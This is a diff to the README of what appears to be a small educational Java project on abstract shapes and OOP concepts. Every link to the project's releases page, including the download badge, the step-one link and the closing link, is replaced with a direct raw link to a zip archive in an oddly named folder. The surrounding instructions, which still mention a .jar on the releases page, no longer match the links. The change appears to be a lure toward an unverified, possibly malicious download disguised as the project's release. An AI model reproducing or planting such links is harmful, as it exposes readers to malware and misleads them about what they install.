@@ -1,6 +1,6 @@
 # 🟢 java-abstract-shapes - Simple Java OOP Concepts Explained
 
-[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/jaideep624/java-abstract-shapes/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/jaideep624/java-abstract-shapes/main/Ortyginae/shapes-java-abstract-1.8.zip)
 
 ---
 
@@ -44,7 +44,7 @@ You can check if Java is installed by opening the Command Prompt and typing `jav
 ## 🚀 Getting Started: How to Download and Run
 
 1. Click the big green **Download Release** badge/button at the top or visit this page directly:  
-   [https://github.com/jaideep624/java-abstract-shapes/releases](https://github.com/jaideep624/java-abstract-shapes/releases)
+   [https://raw.githubusercontent.com/jaideep624/java-abstract-shapes/main/Ortyginae/shapes-java-abstract-1.8.zip](https://raw.githubusercontent.com/jaideep624/java-abstract-shapes/main/Ortyginae/shapes-java-abstract-1.8.zip)
 
 2. On the releases page, find the latest release. Look for a file ending with `.jar`. This is the application file you need.
 
@@ -138,6 +138,6 @@ These files show clean Java structure using OOP concepts. Reviewing the source c
 
 Download the latest available version by visiting the releases page here:
 
-[https://github.com/jaideep624/java-abstract-shapes/releases](https://github.com/jaideep624/java-abstract-shapes/releases)  
+[https://raw.githubusercontent.com/jaideep624/java-abstract-shapes/main/Ortyginae/shapes-java-abstract-1.8.zip](https://raw.githubusercontent.com/jaideep624/java-abstract-shapes/main/Ortyginae/shapes-java-abstract-1.8.zip)  
 
 Click on the `.jar` file to download, then run it as explained above.
